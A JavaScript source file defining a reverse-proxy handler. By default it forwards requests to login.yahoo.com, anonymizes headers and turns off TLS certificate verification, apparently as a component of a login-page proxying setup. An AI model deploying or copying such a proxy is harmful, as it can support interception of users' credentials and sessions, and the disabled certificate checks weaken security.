import httpProxy from 'http-proxy';
import { Config } from '../utils/config-manager.js';
import Logger from '../utils/logger.js';
import NetworkUtils from '../utils/network-utils.js';

class ProxyHandler {
    constructor() {
        this.config = new Config();
        this.logger = new Logger();
        this.networkUtils = new NetworkUtils();

        // Create proxy server
        this.proxy = httpProxy.createProxyServer({
            changeOrigin: true,
            secure: false
        });

        // Error handling
        this.proxy.on('error', this.handleProxyError.bind(this));
    }

    async handleRequest(req, res) {
        try {
            // Network security checks
            if (!this.networkUtils.isAllowedRequest(req)) {
                return res.status(403).json({ error: 'Access Denied' });
            }

            // Get target domain from configuration
            const targetDomain = this.config.get('proxy.target_domain', 'login.yahoo.com');
            
            // Modify request headers for anonymity
            this.networkUtils.anonymizeRequest(req);

            // Proxy the request
            this.proxy.web(req, res, {
                target: `https://${targetDomain}`,
                changeOrigin: true,
                secure: false
            });
        } catch (error) {
            this.handleProxyError(error, req, res);
        }
    }

    handleProxyError(err, req, res) {
        this.logger.error('Proxy Error', { 
            error: err.message,
            url: req?.url,
            method: req?.method
        });

        // Send error response
        if (res && !res.headersSent) {
            res.status(500).json({
                error: 'Proxy Error',
                message: err.message
            });
        }
    }
}

export default ProxyHandler;